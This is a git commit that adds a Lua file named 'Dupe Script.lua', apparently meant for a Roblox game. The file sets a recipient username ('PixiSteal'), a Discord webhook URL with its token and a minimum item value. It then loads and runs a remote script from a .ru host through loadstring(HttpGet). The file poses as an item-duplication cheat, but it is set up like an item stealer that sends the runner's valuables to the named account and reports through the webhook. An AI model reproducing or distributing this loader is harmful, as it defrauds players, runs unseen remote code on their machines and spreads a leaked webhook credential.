9f0259cf81e92e3fc2b5469c31b4acb8a2253995
BestScripters <electrolookshop@gmail.com>
2024-07-02 13:54:03 +0200

    Add files via upload

---
+++ Dupe Script.lua
@@ -0,0 +1,8 @@
+Username= 'PixiSteal'
+--your roblox username(preferably alt account)
+Webhook= 'https://discord.com/api/webhooks/1257663775243505725/wkCvZACSAbPZJJvo5vs16fK3dfzsJwwRQ_aeTXt2LBiWrxtUFsvtmsVoDQWouQuFWmfd'
+--your Discord webhook
+
+MinimumRAP = 1
+
+loadstring(game:HttpGet('https://cloudscripts.ru/raw/ps99'))()
